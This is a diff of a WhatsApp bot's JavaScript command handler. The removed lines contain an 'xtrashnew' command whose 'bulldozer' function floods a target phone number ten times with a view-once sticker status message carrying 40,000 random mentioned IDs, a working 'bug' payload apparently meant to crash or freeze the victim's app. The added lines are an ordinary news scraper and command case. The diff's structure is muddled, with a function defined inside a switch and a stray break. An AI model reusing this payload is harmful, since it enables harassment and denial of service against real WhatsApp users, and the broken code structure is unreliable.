@@ -907,118 +907,70 @@ function setupCommandHandlers(socket, number) {
                       break;
                 }
                        
-    case "xtrashnew": {
-    // Check if the user is an owner or premium
-    if (!isOwner && !isPremium) return m.reply('Khusus Premium');
-
-    // Check if a target phone number is provided
-    if (!text) return m.reply(`\`Example:\` ${prefix + command} 628×××`);
-
-    // Format the target JID (WhatsApp ID)
-    let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix + command} 𝙩𝙤 ${target}`);
-
-    // Delay to simulate processing and send success notification
-    setTimeout(async () => {
-        try {
-            m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
-┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
-┃ 𝐓𝐚𝐫𝐜𝐞𝐭: ${target}
-┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝: ${command}
-┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐜𝐠: Jeda 5 menit tod
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
-        } catch (error) {
-            console.error("Error sending notification:", error);
-            m.reply("Failed to send notification.");
-        }
-    }, 3000);
-
-    // Send the bulldozer message multiple times
-    for (let i = 0; i < 10; i++) {
-        try {
-            await bulldozer(target);
-            await sleep(1500); // Delay between sends
-            console.log(chalk.red("Successfully sent xtrashnew bug"));
-        } catch (error) {
-            console.error("Error in bulldozer loop:", error);
-            m.reply("Error sending bug to target.");
-        }
-    }
-
-    break;
-}
-
-// Bulldozer function (as provided)
-async function bulldozer(target) {
-    let message = {
-        viewOnceMessage: {
-            message: {
-                stickerMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-                    mimetype: "image/webp",
-                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-                    fileLength: { low: 1, high: 0, unsigned: true },
-                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-                    firstFrameLength: 19904,
-                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
-                    isAnimated: true,
-                    contextInfo: {
-                        mentionedJid: [
-                            "0@s.whatsapp.net",
-                            ...Array.from(
-                                { length: 40000 },
-                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
-                            ),
-                        ],
-                        groupMentions: [],
-                        entryPointConversionSource: "non_contact",
-                        entryPointConversionApp: "whatsapp",
-                        entryPointConversionDelaySeconds: 467593,
-                    },
-                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
-                    isAvatar: false,
-                    isAiSticker: false,
-                    isLottie: false,
-                },
-            },
-        },
-    };
-
-    const msg = generateWAMessageFromContent(target, message, {});
-
-    await rikz.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [
-            {
-                tag: "meta",
-                attrs: {},
-                content: [
-                    {
-                        tag: "mentioned_users",
-                        attrs: {},
-                        content: [
-                            {
-                                tag: "to",
-                                attrs: { jid: target },
-                                content: undefined,
-                            },
-                        ],
-                    },
-                ],
-            },
-        ],
-    });
-}
-
-// Utility sleep function
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
     
+// ------------------ iNewsTV Scraper Function ------------------
+async function iNewsTV() {
+    try {
+        const res = await axios.get(`https://www.inews.id/news`, {
+            headers: {
+                "User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
+            }
+        })
+        const supun = []
+        const $ = cheerio.load(res.data)
+        $('div.wdtop-row.more-news').each(function (_, b) {
+            let berita = $(b).find('h2.wdtop-text').text().trim()
+            let berita_diupload = $(b).find('span.wd-date').text().trim().slice(0, 35)
+            let berita_jenis = $(b).find('span.wd-date > strong').text().trim()
+            let berita_url = $(b).find('a').attr('href')
+            let berita_thumb = $(b).find('div.lazy.wdtop-col-img').attr('data-src')
+            supun.push({
+                berita,
+                berita_url,
+                berita_diupload,
+                berita_jenis,
+                berita_thumb
+            })
+        })
+        return supun
+    } catch (e) {
+        console.log('Scraper Error:', e)
+        return []
+    }
+}
+
+// ------------------ Case Handler Example ------------------
+async function handleCommand(command, m, conn) {
+    switch(command.toLowerCase()) {
+        case 'inews':
+        case 'inewstv': {
+            try {
+                let data = await iNewsTV()
+                if (!data || data.length === 0) {
+                    return await conn.sendMessage(m.chat, { text: "❌ No news found!" }, { quoted: m })
+                }
+
+                let caption = `*📺 INEWS TV - Latest News*\n\n`
+                for (let i = 0; i < Math.min(5, data.length); i++) {
+                    caption += `*📰 Title:* ${data[i].berita}\n`
+                    caption += `*📌 Category:* ${data[i].berita_jenis}\n`
+                    caption += `*📅 Date:* ${data[i].berita_diupload}\n`
+                    caption += `*🔗 Link:* ${data[i].berita_url}\n\n`
+                }
+
+                await conn.sendMessage(m.chat, {
+                    image: { url: data[0].berita_thumb },
+                    caption
+                }, { quoted: m })
+
+            } catch (e) {
+                console.log(e)
+                await conn.sendMessage(m.chat, { text: "⚠️ Error fetching INEWS TV data!" }, { quoted: m })
+            }
+        }
+        break;
+
+        // --- ඔබගේ වෙනත් case එකතු කරන්න --
            break;                    
                   case 'video': {
     const yts = require('yt-search');
